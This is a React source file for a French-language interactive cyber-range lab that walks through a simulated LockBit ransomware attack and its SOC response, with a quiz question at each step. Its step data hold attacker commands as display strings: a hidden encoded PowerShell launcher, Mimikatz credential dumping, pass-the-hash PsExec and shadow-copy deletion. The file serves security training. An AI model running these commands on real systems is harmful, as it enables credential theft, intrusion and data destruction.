import React, { useState } from 'react'
import { Link } from 'react-router-dom'
import { motion, AnimatePresence } from 'framer-motion'
import {
  Play,
  RotateCcw,
  CheckCircle2,
  AlertTriangle,
  Terminal,
  ShieldCheck,
  Server,
  Laptop,
  User,
  Skull,
  Lock,
  Unlock,
  Key,
  Network,
  HelpCircle,
  Radio,
  Zap,
  Sparkles,
  Award,
  Clock,
  Send,
  ArrowRight,
  ArrowLeft,
  Eye,
  Info,
  Layers,
  ChevronRight,
  ShieldAlert,
  Flame,
  FileText,
  Activity,
  Database,
  Sliders,
  Cpu,
  CornerDownRight,
  Maximize2,
  Volume2,
  VolumeX,
} from 'lucide-react'
import { sound } from '../utils/audio'
import { narrator } from '../utils/voice'

interface SimulationStep {
  id: number
  phaseNum: string
  title: string
  subtitle: string
  type: 'attack' | 'defense'
  sourceKey: 'hacker' | 'sophie' | 'server' | 'ransomware' | 'soc' | 'airgap'
  targetKey: 'hacker' | 'sophie' | 'server' | 'ransomware' | 'soc' | 'airgap'
  arrowLabel: string
  arrowColor: string
  voiceText: string
  actionDescription: string
  commandExecuted: string
  telemetryLogs: string[]
  question: string
  options: string[]
  correctOptionIndex: number
  explanation: string
  evidenceDetail: string
}

export default function CyberRangeLab() {
  const [currentStepIdx, setCurrentStepIdx] = useState<number>(0)
  const [isExecuting, setIsExecuting] = useState<boolean>(false)
  const [hasExecutedCurrent, setHasExecutedCurrent] = useState<boolean>(false)
  const [isVoiceMuted, setIsVoiceMuted] = useState<boolean>(narrator.isMuted())

  // Suivi de l'investigation (questions répondues)
  const [answeredSteps, setAnsweredSteps] = useState<{ [key: number]: number }>({})
  const [selectedOption, setSelectedOption] = useState<number | null>(null)
  const [showExplanation, setShowExplanation] = useState<boolean>(false)
  const [investigationScore, setInvestigationScore] = useState<number>(0)

  // Zoom sur image
  const [zoomedImage, setZoomedImage] = useState<string | null>(null)

  const toggleVoice = () => {
    const muted = narrator.toggleMute()
    setIsVoiceMuted(muted)
  }

  // LES 6 ENTITÉS MAJEURES AVEC DE VRAIES GRANDES IMAGES
  const entities = {
    hacker: {
      id: 'hacker',
      name: 'L\'Attaquant (Shadow APT)',
      role: 'Opérateur Malveillant',
      tech: 'Kali Linux C2 (198.51.100.89)',
      image: '/hacker_avatar.jpg',
      color: 'border-rose-500/60 ring-rose-500/40 text-rose-400',
      badgeBg: 'bg-rose-950/80 text-rose-300 border-rose-700',
    },
    sophie: {
      id: 'sophie',
      name: 'Sophie (Responsable RH)',
      role: 'Victime du Phishing',
      tech: 'Poste PC-RH-01 (192.168.10.14)',
      image: '/victim_sophie.jpg',
      color: 'border-blue-500/60 ring-blue-500/40 text-blue-400',
      badgeBg: 'bg-blue-950/80 text-blue-300 border-blue-700',
    },
    server: {
      id: 'server',
      name: 'Serveurs & Active Directory',
      role: 'Cœur de Données & Identités',
      tech: 'DC01 & SRV-FILE (192.168.10.20)',
      image: '/server_datacenter.jpg',
      color: 'border-purple-500/60 ring-purple-500/40 text-purple-400',
      badgeBg: 'bg-purple-950/80 text-purple-300 border-purple-700',
    },
    ransomware: {
      id: 'ransomware',
      name: 'Impact LockBit (420 Go Chiffrés)',
      role: 'Verrouillage & Chantage',
      tech: 'Chiffrement AES-256 + RSA-4096',
      image: '/ransomware_screen.jpg',
      color: 'border-red-600/70 ring-red-500/50 text-red-400',
      badgeBg: 'bg-red-950/90 text-red-300 border-red-700',
    },
    soc: {
      id: 'soc',
      name: 'Marc (Analyste SOC)',
      role: 'Défenseur & Réponse Crise',
      tech: 'Console EDR SentinelOne (192.168.20.50)',
      image: '/soc_analyst_marc.jpg',
      color: 'border-cyan-500/60 ring-cyan-500/40 text-cyan-400',
      badgeBg: 'bg-cyan-950/80 text-cyan-300 border-cyan-700',
    },
    airgap: {
      id: 'airgap',
      name: 'Coffre Air-Gap (Veeam v12)',
      role: 'Sauvegarde Immuable Hors-Ligne',
      tech: 'Stockage WORM (192.168.99.10)',
      image: '/backup_airgap.jpg',
      color: 'border-emerald-500/60 ring-emerald-500/40 text-emerald-400',
      badgeBg: 'bg-emerald-950/80 text-emerald-300 border-emerald-700',
    },
  }

  // LES 8 ÉTAPES END-TO-END DE LA CHAÎNE D'ATTAQUE ET DE RÉSOLUTION
  const steps: SimulationStep[] = [
    {
      id: 0,
      phaseNum: 'Étape 1 / 8',
      title: 'Infiltration Initiale : Envoi de l\'Hameçonnage Ciblé',
      subtitle: 'De l\'Attaquant (Hacker) vers Sophie (RH)',
      type: 'attack',
      sourceKey: 'hacker',
      targetKey: 'sophie',
      arrowLabel: 'Flèche 1 : Courriel SMTP piégé (.docm)',
      arrowColor: '#f43f5e',
      voiceText:
        'Étape 1 : L\'attaquant envoie un courriel de spear-phishing ciblé avec une macro malveillante à Sophie.',
      actionDescription:
        'L\'attaquant émet un courriel usurpant la direction avec la pièce jointe Grille_Salaires_2026.docm. Le courriel franchit la passerelle et arrive sur l\'écran de Sophie.',
      commandExecuted:
        'sendemail -f "rh-direction@societe-portail-rh.online" -t "sophie.martin@meridian.corp" -u "[URGENT] Mise a jour salaires 2026" -a Grille_Salaires_2026.docm',
      telemetryLogs: [
        'MAIL-GW [INFO] Inbound SMTP from 198.51.100.89:54122 -> 192.168.10.14:25',
        'MAIL-GW [WARN] Piece jointe suspecte : Grille_Salaires_2026.docm (Macro autorisee)',
        'PC-RH-01 [OUTLOOK] Notification : Nouveau courriel urgent recu par Sophie',
      ],
      question: 'Quel composant du fichier Word permet l\'exécution furtive de code sur le PC de Sophie ?',
      options: [
        'Une image JPEG haute résolution',
        'Une macro VBA intégrée (.docm) qui lance PowerShell à l\'ouverture',
        'Un script PHP hébergé sur le cloud',
        'Une signature numérique certifiée',
      ],
      correctOptionIndex: 1,
      explanation:
        'Les fichiers au format .docm autorisent les macros Visual Basic for Applications (VBA). Dès que l\'utilisateur clique sur "Activer le contenu", la macro s\'exécute immédiatement en mémoire.',
      evidenceDetail:
        'Fichier intercepté : Grille_Salaires_2026.docm | SHA256: 7d1a29f... | Type : Macro Downloader',
    },
    {
      id: 1,
      phaseNum: 'Étape 2 / 8',
      title: 'Compromission & Balise C2 HTTPS Sortante',
      subtitle: 'Du poste de Sophie vers le serveur de contrôle de l\'Attaquant',
      type: 'attack',
      sourceKey: 'sophie',
      targetKey: 'hacker',
      arrowLabel: 'Flèche 2 : Canal sortant HTTPS port 443',
      arrowColor: '#ec4899',
      voiceText:
        'Étape 2 : Sophie clique sur la pièce jointe. Une balise de commande HTTPS sortante s\'établit vers le serveur du pirate.',
      actionDescription:
        'Sophie ouvre le document. La macro exécute PowerShell en arrière-plan sans message d\'alerte et établit une session chiffrée sortante (Reverse Shell) vers le serveur Kali de l\'attaquant.',
      commandExecuted:
        'powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0...',
      telemetryLogs: [
        'SYSMON [ID 1] Process Create: powershell.exe Parent: WINWORD.EXE User: MERIDIAN\\smartin',
        'FIREWALL [PERMIT] 192.168.10.14:49812 -> 198.51.100.89:443 (TCP/HTTPS SORTANT)',
        'KALI-C2 [SUCCESS] Session Meterpreter ouverte depuis le poste de Sophie !',
      ],
      question: 'Pourquoi le pare-feu d\'entreprise autorise-t-il cette connexion sans la bloquer ?',
      options: [
        'L\'attaquant s\'est branché physiquement sur la prise murale',
        'La connexion sortante utilise le port HTTPS 443 standard autorisé pour le web',
        'Le pare-feu était en panne de batterie',
        'L\'antivirus de Sophie a donné son accord',
      ],
      correctOptionIndex: 1,
      explanation:
        'Le port 443 est ouvert pour permettre aux salariés d\'accéder à Internet. L\'attaquant encapsule son flux de contrôle dans des requêtes web chiffrées indifférenciables d\'un surf normal.',
      evidenceDetail:
        'Session C2 active : 198.51.100.89:443 <-> 192.168.10.14:49812 | Protocole TLS 1.3 chiffré',
    },
    {
      id: 2,
      phaseNum: 'Étape 3 / 8',
      title: 'Élévation de Privilèges : Injection Mimikatz dans LSASS',
      subtitle: 'Du poste de Sophie vers les identifiants Active Directory',
      type: 'attack',
      sourceKey: 'sophie',
      targetKey: 'server',
      arrowLabel: 'Flèche 3 : Dump mémoire LSASS & Vol Admin',
      arrowColor: '#a855f7',
      voiceText:
        'Étape 3 : L\'attaquant utilise Mimikatz pour voler le mot de passe de l\'administrateur du domaine dans la mémoire vive.',
      actionDescription:
        'L\'attaquant injecte Mimikatz dans le processus système lsass.exe sur le poste de Sophie. Il extrait le hash NTLM du compte Administrateur du Domaine (DA_admin) qui s\'était connecté auparavant.',
      commandExecuted:
        'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit',
      telemetryLogs: [
        'SYSMON [ID 10] Process Access: Injection de code suspect dans lsass.exe (PID 672)',
        'MIMIKATZ [EXTRACT] Compte trouvé : MERIDIAN\\DA_admin',
        'MIMIKATZ [HASH] NTLM : 8846f7eaee8fb117ad06bdd830b7586c (Identifiants Admin capturés)',
      ],
      question: 'Quel processus système Windows est ciblé pour voler les identifiants en mémoire ?',
      options: [
        'notepad.exe',
        'lsass.exe (Local Security Authority)',
        'calc.exe',
        'explorer.exe',
      ],
      correctOptionIndex: 1,
      explanation:
        'Le processus système lsass.exe stocke les jetons et empreintes d\'authentification en RAM. Sans durcissement (Credential Guard), Mimikatz peut en extraire les mots de passe et hash NTLM.',
      evidenceDetail:
        'Compte capturé : MERIDIAN\\DA_admin | Hash NTLM prêt pour attaque Pass-The-Hash',
    },
    {
      id: 3,
      phaseNum: 'Étape 4 / 8',
      title: 'Mouvement Latéral : Rebond SMB vers le Serveur de Fichiers',
      subtitle: 'Du poste de Sophie vers le serveur de fichiers critique',
      type: 'attack',
      sourceKey: 'sophie',
      targetKey: 'server',
      arrowLabel: 'Flèche 4 : Rebond SMB port 445 (PsExec)',
      arrowColor: '#f97316',
      voiceText:
        'Étape 4 : Rebond latéral. L\'attaquant utilise le protocole SMB pour prendre le contrôle à distance du serveur de fichiers.',
      actionDescription:
        'Muni du hash administrateur, l\'attaquant utilise PsExec via le protocole SMB (port 445) pour se connecter au serveur de fichiers central SRV-DATA et y déployer sa charge finale.',
      commandExecuted:
        'psexec.py MERIDIAN/DA_admin@192.168.10.20 -hashes :8846f7eaee8fb117ad06bdd830b7586c "cmd.exe"',
      telemetryLogs: [
        'SRV-FILE [AUTH] Connexion SMB réussie depuis 192.168.10.14 avec compte DA_admin',
        'SRV-FILE [SERVICE] Création du service distant PSEXESVC',
        'SRV-FILE [ACCESS] Shell obtenu avec les privilèges NT AUTHORITY\\SYSTEM',
      ],
      question: 'Quel protocole réseau Windows interne (port 445) est utilisé pour ce mouvement latéral ?',
      options: [
        'FTP (File Transfer Protocol)',
        'SMB (Server Message Block)',
        'DNS (Domain Name Service)',
        'SMTP (Mail)',
      ],
      correctOptionIndex: 1,
      explanation:
        'Le protocole SMB (port 445) est utilisé pour partager des fichiers et exécuter des services distants via PsExec, permettant de pivoter d\'une machine à une autre en interne.',
      evidenceDetail:
        'Cible compromise : Serveur central 192.168.10.20 | Droits : SYSTEM maximal',
    },
    {
      id: 4,
      phaseNum: 'Étape 5 / 8',
      title: 'Impact Rançongiciel : Verrouillage des 420 Go (LockBit)',
      subtitle: 'Du Serveur vers l\'Écran de Rançon et Chantage',
      type: 'attack',
      sourceKey: 'server',
      targetKey: 'ransomware',
      arrowLabel: 'Flèche 5 : Chiffrement LockBit & destruction vssadmin',
      arrowColor: '#dc2626',
      voiceText:
        'Étape 5 : Le rançongiciel LockBit détruit les sauvegardes locales et verrouille les 420 Go en réclamant 15 Bitcoins.',
      actionDescription:
        'Le rançongiciel détruit les Volume Shadow Copies avec vssadmin pour empêcher la restauration Windows, puis chiffre l\'intégralité des 420 Go de données d\'entreprise avec AES-256 + RSA-4096.',
      commandExecuted:
        'vssadmin.exe delete shadows /all /quiet & lockbit3.exe -path \\\\SRV-FILE-01\\Partages',
      telemetryLogs: [
        'SRV-FILE [VSS] Volume Shadow Copies supprimées (aucun retour arrière Windows possible)',
        'SRV-FILE [LOCKBIT] 89,450 fichiers renommés en *.lockbit',
        'SRV-FILE [NOTE] Fichier RESTORE-MY-FILES.txt généré : Rançon de 15 Bitcoins exigée',
      ],
      question: 'Pourquoi l\'attaquant supprime-t-il les clichés instantanés vssadmin avant de chiffrer ?',
      options: [
        'Pour libérer de l\'espace disque',
        'Pour empêcher les administrateurs de restaurer les fichiers via Windows',
        'Pour accélérer la vitesse du réseau',
        'Pour changer le mot de passe du serveur',
      ],
      correctOptionIndex: 1,
      explanation:
        'La suppression des copies de l\'ombre (Volume Shadow Copies) est la signature des rançongiciels : elle garantit que les victimes ne pourront pas annuler le chiffrement d\'un simple clic droit sous Windows.',
      evidenceDetail:
        'Volume chiffré : 420 Go de contrats, bases SQL et paies bloqués sous extension .lockbit',
    },
    {
      id: 5,
      phaseNum: 'Étape 6 / 8',
      title: 'Détection SOC : Remontée d\'Alerte & Déclenchement de Crise',
      subtitle: 'Du Serveur attaqué vers Marc (Analyste SOC)',
      type: 'defense',
      sourceKey: 'server',
      targetKey: 'soc',
      arrowLabel: 'Flèche 6 : Alerte télémétrie critique vers le SOC',
      arrowColor: '#0ea5e9',
      voiceText:
        'Étape 6 : Alerte au centre de sécurité. L\'agent EDR détecte une entropie de chiffrement anormale et prévient Marc.',
      actionDescription:
        'L\'agent EDR détecte une écriture massive de fichiers à très forte entropie (chiffrement) et la suppression suspecte des sauvegardes locales. Une alerte rouge retentit sur les écrans de Marc au SOC.',
      commandExecuted:
        'EDR-Agent::SendAlert(Severity=CRITICAL, Threat="Ransom.Win64.LockBit", Host="SRV-FILE-01")',
      telemetryLogs: [
        'EDR-SOC [ALERTE ROUGE] Hôte : SRV-FILE-01 (192.168.10.20) Entropie : 7.98/8.0',
        'SIEM-CORRELATION [INCIDENT] Corrélation : Email PC-RH-01 + Rebond SMB + LockBit',
        'MARC-SOC [ACTION] Déclenchement immédiat de la cellule de crise cyber',
      ],
      question: 'Quel indice télémétrique permet à l\'EDR de repérer l\'action du rançongiciel en direct ?',
      options: [
        'L\'ordinateur a surchauffé',
        'La mesure d\'un taux d\'entropie très élevé correspondant à un chiffrement de masse',
        'Un SMS reçu par le directeur',
        'Une alerte météo',
      ],
      correctOptionIndex: 1,
      explanation:
        'Les données chiffrées ont une signature d\'entropie aléatoire proche de 8. L\'EDR compare ce score et identifie instantanément une activité de chiffrement hostile.',
      evidenceDetail:
        'Alerte SOC : Sévérité 10/10 | Menace identifiée : LockBit 3.0 Ransomware',
    },
    {
      id: 6,
      phaseNum: 'Étape 7 / 8',
      title: 'Isolation d\'Urgence : Coupure Réseau du Poste Infecté',
      subtitle: 'De Marc (Analyste SOC) vers Sophie (Poste Patient Zéro)',
      type: 'defense',
      sourceKey: 'soc',
      targetKey: 'sophie',
      arrowLabel: 'Flèche 7 : Coupure réseau logique (Isolation EDR)',
      arrowColor: '#eab308',
      voiceText:
        'Étape 7 : Marc ordonne l\'isolation réseau immédiate du poste de Sophie pour stopper la communication avec le pirate.',
      actionDescription:
        'Marc déclenche l\'ordre d\'isolation réseau via l\'EDR. Le poste PC-RH-01 est immédiatement coupé de tout le réseau local et Internet. La balise du pirate est tranchée net.',
      commandExecuted:
        'Invoke-EDRHostContainment -Hostname "PC-RH-01" -Action IsolateNetwork -KillProcess PID_4912',
      telemetryLogs: [
        'EDR-SOC [CMD] Ordre d\'isolation réseau expédié à PC-RH-01 (192.168.10.14)',
        'PC-RH-01 [AGENT] Pare-feu local verrouillé : Tous les ports bloqués',
        'KALI-C2 [LOST] Connexion interrompue par le pair : Session pirate terminée !',
      ],
      question: 'Quelle est la première mesure d\'urgence pour stopper la propagation d\'une attaque en cours ?',
      options: [
        'Redémarrer tous les ordinateurs sans rien sauvegarder',
        'Isoler immédiatement le poste infecté du réseau (logiquement ou en débranchant le câble)',
        'Envoyer un mail à tous les employés',
        'Payer la rançon immédiatement',
      ],
      correctOptionIndex: 1,
      explanation:
        'L\'isolation réseau coupe immédiatement la communication entre l\'attaquant et la machine sans éteindre l\'ordinateur, ce qui préserve la mémoire vive pour l\'enquête médico-légale.',
      evidenceDetail:
        'Poste PC-RH-01 : ISOLÉ DU RÉSEAU | Patient zéro maîtrisé | Zéro fuite résiduelle',
    },
    {
      id: 7,
      phaseNum: 'Étape 8 / 8',
      title: 'Restauration Étanche : Rétablissement depuis le Coffre Air-Gap',
      subtitle: 'Du Coffre Air-Gap vers les Serveurs d\'Entreprise',
      type: 'defense',
      sourceKey: 'airgap',
      targetKey: 'server',
      arrowLabel: 'Flèche 8 : Restauration saine 420 Go (Zéro Rançon)',
      arrowColor: '#10b981',
      voiceText:
        'Étape 8 : Victoire ! Les 420 Go sont restaurés depuis le coffre immuable Air-Gap. Zéro rançon versée, activité rétablie.',
      actionDescription:
        'L\'équipe connecte le coffre de sauvegarde Air-Gap protégé en écriture immuable. Les 420 Go de contrats, données comptables et bases SQL sont réinjectés sur le serveur nettoyé. L\'entreprise repart saine et sauve !',
      commandExecuted:
        'Start-VeeamRestore -BackupSet "SNAPSHOT_IMMUTABLE_J-1" -Target "SRV-FILE-01" -VerifyIntegrity',
      telemetryLogs: [
        'AIRGAP-VAULT [CONNECT] Liaison étanche ouverte vers SRV-FILE-01',
        'VEEAM-V12 [CHECK] Intégrité cryptographique des snapshots : 100% Non altérés',
        'SRV-FILE [RESTORE] Remplacement des fichiers chiffrés : 89,450 fichiers sains restaurés',
        'CRISE-CYBER [VICTOIRE] Données restaurées à 100%. Rançon payée : 0 €. Reprise d\'activité !',
      ],
      question: 'Pourquoi la sauvegarde du coffre Air-Gap n\'a-t-elle pas pu être chiffrée par le rançongiciel ?',
      options: [
        'Parce que le pirate a oublié son mot de passe',
        'Parce qu\'elle est physiquement isolée du réseau (Air-Gap) et protégée en immuabilité non modifiable',
        'Parce qu\'elle était stockée sur une clé USB dans un tiroir',
        'Parce que le serveur était éteint la nuit',
      ],
      correctOptionIndex: 1,
      explanation:
        'L\'isolation physique (Air-Gap : aucun lien réseau en temps normal) combinée à l\'immuabilité (WORM : Write Once, Read Many) rend les sauvegardes physiquement et logiquement inaltérables par un pirate.',
      evidenceDetail:
        'Résultat final : 100% des données récupérées | Coût de la rançon : 0 € | Entreprise sauvée',
    },
  ]

  const currentStep = steps[currentStepIdx]
  const sourceEntity = entities[currentStep.sourceKey]
  const targetEntity = entities[currentStep.targetKey]

  // Déclencher l'exécution manuelle de l'étape
  const handleExecuteCurrentStep = () => {
    sound.playLaser()
    setIsExecuting(true)
    narrator.speak(currentStep.voiceText)

    setTimeout(() => {
      setIsExecuting(false)
      setHasExecutedCurrent(true)
      sound.playSuccess()
    }, 2500)
  }

  // Valider la réponse à la question d'investigation
  const handleAnswerSubmit = (optionIndex: number) => {
    setSelectedOption(optionIndex)
    setShowExplanation(true)

    if (optionIndex === currentStep.correctOptionIndex) {
      sound.playSuccess()
      if (answeredSteps[currentStep.id] === undefined) {
        setAnsweredSteps((prev) => ({ ...prev, [currentStep.id]: optionIndex }))
        setInvestigationScore((prev) => prev + 125) // 8 étapes * 125 = 1000 pts
      }
    } else {
      sound.playError()
    }
  }

  const handleNextStep = () => {
    sound.playClick()
    if (currentStepIdx < steps.length - 1) {
      setCurrentStepIdx((prev) => prev + 1)
      setSelectedOption(null)
      setShowExplanation(false)
      setHasExecutedCurrent(false)
    }
  }

  const handlePrevStep = () => {
    sound.playClick()
    if (currentStepIdx > 0) {
      setCurrentStepIdx((prev) => prev - 1)
      setSelectedOption(null)
      setShowExplanation(false)
      setHasExecutedCurrent(false)
    }
  }

  const handleResetLab = () => {
    sound.playLaser()
    setCurrentStepIdx(0)
    setAnsweredSteps({})
    setSelectedOption(null)
    setShowExplanation(false)
    setInvestigationScore(0)
    setHasExecutedCurrent(false)
  }

  const totalAnswered = Object.keys(answeredSteps).length

  return (
    <div className="max-w-7xl mx-auto px-4 sm:px-6 py-6 font-sans text-slate-900 select-none">
      {/* 1. EN-TÊTE DU CYBER RANGE PROFESSIONNEL (BLANC & BLEU CIEL) */}
      <div className="flex flex-col md:flex-row items-start md:items-center justify-between gap-4 border-b border-slate-200 pb-5 mb-6">
        <div>
          <div className="flex items-center gap-2 mb-1.5">
            <span className="px-3 py-0.5 rounded-full bg-sky-50 text-sky-700 border border-sky-200 text-xs font-mono font-bold uppercase tracking-wider flex items-center gap-1.5 shadow-sm">
              <Network size={15} />
              LAB D'INVESTIGATION INTERACTIF
            </span>
            <span className="text-xs text-slate-500 font-medium">
              Simulation End-to-End avec Illustrations Réelles
            </span>
          </div>
          <h1 className="text-2xl md:text-4xl font-extrabold tracking-tight text-slate-900">
            Architecture Réseau & Simulation de la Crise
          </h1>
          <p className="text-sm text-slate-600 mt-1.5 max-w-2xl leading-relaxed">
            Reproduction visuelle de toute la chaîne : de l'Attaquant à Sophie (RH), du Serveur à LockBit, et de Marc (SOC) jusqu'au Coffre Air-Gap.
          </p>
        </div>

        {/* Tableau de bord & Contrôles Audio */}
        <div className="flex items-center gap-3 bg-white border border-slate-200 px-5 py-2.5 rounded-2xl shadow-soft">
          <div className="text-right">
            <span className="text-[11px] text-slate-500 font-mono font-bold uppercase block">Score d'Analyse</span>
            <span className="text-base font-extrabold font-mono text-sky-600">
              {investigationScore} / 1000 pts
            </span>
          </div>

          <div className="h-8 w-px bg-slate-200" />

          <button
            onClick={toggleVoice}
            className={`flex items-center gap-2 px-3.5 py-2 rounded-xl border text-xs font-bold transition shadow-sm ${
              !isVoiceMuted
                ? 'bg-sky-50 border-sky-300 text-sky-700'
                : 'bg-white border-slate-300 text-slate-500 hover:text-slate-800'
            }`}
            title="Activer/Couper la voix explicative"
          >
            {!isVoiceMuted ? <Volume2 size={16} /> : <VolumeX size={16} />}
            <span className="font-sans">{!isVoiceMuted ? 'Voix active' : 'Voix coupée'}</span>
          </button>

          <button
            onClick={handleResetLab}
            className="p-2.5 rounded-xl bg-white hover:bg-slate-50 border border-slate-300 text-slate-600 hover:text-sky-600 transition shadow-sm"
            title="Réinitialiser la simulation"
          >
            <RotateCcw size={15} />
          </button>
        </div>
      </div>

      {/* 2. SÉLECTEUR RAPIDE DES 8 PHASES CHRONOLOGIQUES */}
      <div className="flex items-center gap-2 bg-slate-100/80 p-2 rounded-2xl border border-slate-200 mb-6 overflow-x-auto shadow-inner">
        {steps.map((st, i) => {
          const isCurrent = currentStepIdx === i
          const isDone = answeredSteps[st.id] !== undefined
          return (
            <button
              key={st.id}
              onClick={() => {
                sound.playClick()
                setCurrentStepIdx(i)
                setSelectedOption(null)
                setShowExplanation(false)
                setHasExecutedCurrent(false)
              }}
              className={`flex-1 min-w-[130px] py-2.5 px-3 rounded-xl text-xs font-bold transition flex items-center justify-between gap-2 ${
                isCurrent
                  ? 'bg-white text-sky-700 border border-sky-300 shadow-sm font-bold'
                  : isDone
                  ? 'bg-white/60 text-emerald-700 border border-emerald-200'
                  : 'text-slate-600 hover:text-slate-900 hover:bg-white/80'
              }`}
            >
              <div className="flex items-center gap-1.5 truncate">
                <span className="text-[11px] font-mono opacity-80 font-bold">#{i + 1}</span>
                <span className="truncate">{st.type === 'attack' ? 'Attaque' : 'Défense'}</span>
              </div>
              {isDone ? (
                <CheckCircle2 size={15} className="text-emerald-600 shrink-0" />
              ) : (
                <span className="w-2 h-2 rounded-full border border-slate-300 shrink-0" />
              )}
            </button>
          )
        })}
      </div>

      {/* 3. LES 6 GRANDES IMAGES D'ARCHITECTURE AVEC FLÈCHES ET INTERACTIONS EN TEMPS RÉEL */}
      <div className="p-6 rounded-3xl bg-white border border-slate-200/90 shadow-soft mb-6 relative overflow-hidden">
        <div className="flex items-center justify-between pb-3 mb-5 border-b border-slate-200">
          <div className="flex items-center gap-2">
            <span className="w-2.5 h-2.5 rounded-full bg-sky-500 animate-ping" />
            <h2 className="text-xs font-mono font-bold text-sky-800 uppercase tracking-wider">
              Acteurs & Nœuds d'Infrastructure Réseau
            </h2>
          </div>

          <div className="flex items-center gap-2">
            <span className="text-xs font-mono font-bold text-sky-800 px-3 py-1 rounded-xl bg-sky-50 border border-sky-200 shadow-sm">
              {currentStep.arrowLabel}
            </span>
          </div>
        </div>

        {/* GRILLE DES 6 GRANDES CARTES ILLUSTRÉES */}
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-6 gap-4">
          {Object.values(entities).map((ent) => {
            const isSource = currentStep.sourceKey === ent.id
            const isTarget = currentStep.targetKey === ent.id
            const isActive = isSource || isTarget

            return (
              <div
                key={ent.id}
                onClick={() => setZoomedImage(ent.image)}
                className={`group rounded-2xl border overflow-hidden transition-all flex flex-col justify-between cursor-pointer relative ${
                  isActive
                    ? 'border-2 border-sky-500 ring-2 ring-sky-200 bg-sky-50/40 shadow-md scale-[1.02] z-10'
                    : 'border-slate-200 bg-white hover:border-sky-300 hover:shadow-sm opacity-90 hover:opacity-100'
                }`}
              >
                {/* Grande Image Haute Définition */}
                <div className="h-36 w-full relative overflow-hidden bg-slate-100">
                  <img
                    src={ent.image}
                    alt={ent.name}
                    className="w-full h-full object-cover group-hover:scale-105 transition-transform duration-500"
                  />

                  {/* Badge Source / Cible en cours */}
                  {isSource && (
                    <span className="absolute top-2 left-2 px-2.5 py-0.5 rounded-md bg-rose-600 text-white font-mono text-[10px] font-bold uppercase shadow">
                      ÉMETTEUR
                    </span>
                  )}
                  {isTarget && (
                    <span className="absolute top-2 right-2 px-2.5 py-0.5 rounded-md bg-emerald-600 text-white font-mono text-[10px] font-bold uppercase shadow">
                      CIBLE FLÈCHE
                    </span>
                  )}

                  <button
                    onClick={(e) => {
                      e.stopPropagation()
                      setZoomedImage(ent.image)
                    }}
                    className="absolute bottom-2 right-2 p-1.5 rounded-lg bg-black/60 hover:bg-black/90 text-white transition"
                    title="Agrandir l'illustration"
                  >
                    <Maximize2 size={13} />
                  </button>
                </div>

                {/* Métadonnées & Rôle */}
                <div className="p-3.5 flex flex-col justify-between flex-1">
                  <div>
                    <h3 className="text-xs font-extrabold text-slate-900 leading-tight mb-1">{ent.name}</h3>
                    <span className="text-[11px] text-slate-600 block font-medium leading-snug">{ent.role}</span>
                  </div>

                  <div className="mt-2.5 pt-2 border-t border-slate-200 flex items-center justify-between text-[10px] font-mono">
                    <span className="text-slate-500 truncate font-semibold">{ent.tech}</span>
                  </div>
                </div>
              </div>
            )
          })}
        </div>

        {/* Faisceau / Flèche d'animation entre la source et la cible */}
        <div className="mt-6 pt-5 border-t border-slate-200 flex flex-col md:flex-row items-center justify-between gap-4 bg-sky-50/70 p-4 rounded-2xl border border-sky-100">
          <div className="flex items-center gap-3 w-full md:w-auto">
            <div
              className="w-11 h-11 rounded-xl flex items-center justify-center font-black text-lg shrink-0 shadow-sm bg-sky-600 text-white"
            >
              <Zap size={22} />
            </div>

            <div>
              <div className="flex items-center gap-2">
                <span className="text-sm font-extrabold text-slate-900">
                  {sourceEntity.name}
                </span>
                <span className="font-bold text-lg text-sky-600">
                  ➔
                </span>
                <span className="text-sm font-extrabold text-slate-900">
                  {targetEntity.name}
                </span>
              </div>
              <span className="text-xs font-mono text-slate-600 block mt-0.5 font-medium">
                {currentStep.arrowLabel}
              </span>
            </div>
          </div>

          {/* GRAND BOUTON D'ACTION D'EXÉCUTION MANUELLE */}
          <button
            onClick={handleExecuteCurrentStep}
            disabled={isExecuting}
            className="w-full md:w-auto px-7 py-3.5 rounded-xl bg-gradient-to-r from-sky-500 via-sky-600 to-blue-600 hover:from-sky-600 hover:to-blue-700 text-white font-bold text-sm shadow-md flex items-center justify-center gap-2.5 active:scale-95 transition"
          >
            <Zap size={18} className={isExecuting ? 'animate-bounce text-white' : 'text-white'} />
            <span>
              {isExecuting
                ? 'Simulation de la flèche réseau en cours...'
                : hasExecutedCurrent
                ? 'Relancer l\'Action Manuelle'
                : '🚀 Exécuter cette étape manuellement'}
            </span>
          </button>
        </div>
      </div>

      {/* 4. SPLIT-SCREEN INFÉRIEUR : DÉTAILS DE L'ACTION & QUESTION D'INVESTIGATION SOC */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 items-start">
        {/* COLONNE GAUCHE (7 COLONNES) : EXPLICATION DÉTAILLÉE & CONSOLE DE COMMANDES */}
        <div className="lg:col-span-7 space-y-4">
          <div className="p-6 rounded-3xl bg-white border border-slate-200/90 shadow-soft space-y-4">
            <div>
              <div className="flex items-center gap-2 mb-1">
                <span className="text-xs font-mono font-bold text-sky-700 uppercase">
                  {currentStep.phaseNum}
                </span>
                <span className="text-slate-300">/</span>
                <span className="text-xs font-bold text-slate-500">{currentStep.subtitle}</span>
              </div>
              <h3 className="text-xl font-extrabold text-slate-900">{currentStep.title}</h3>
            </div>

            <p className="text-sm text-slate-700 leading-relaxed bg-slate-50 p-4 rounded-2xl border border-slate-200 font-medium">
              {currentStep.actionDescription}
            </p>

            {/* Commande exécutée & Traces */}
            <div className="space-y-2">
              <span className="text-xs font-mono text-slate-600 uppercase font-bold flex items-center gap-1.5">
                <Terminal size={14} className="text-sky-600" />
                <span>Trame & Commande Exécutée en Direct</span>
              </span>

              <div className="bg-slate-900 p-4 rounded-xl border border-slate-800 font-mono text-xs text-emerald-300 break-all shadow-inner">
                $ {currentStep.commandExecuted}
              </div>
            </div>

            {/* Journal de télémétrie */}
            <div className="space-y-2">
              <span className="text-xs font-mono text-slate-600 uppercase font-bold flex items-center gap-1.5">
                <Activity size={14} className="text-sky-600" />
                <span>Journal des Événements & Détections SOC</span>
              </span>

              <div className="bg-slate-900 p-4 rounded-xl border border-slate-800 font-mono text-xs space-y-1.5 text-slate-300 shadow-inner">
                {currentStep.telemetryLogs.map((log, idx) => (
                  <div
                    key={idx}
                    className={
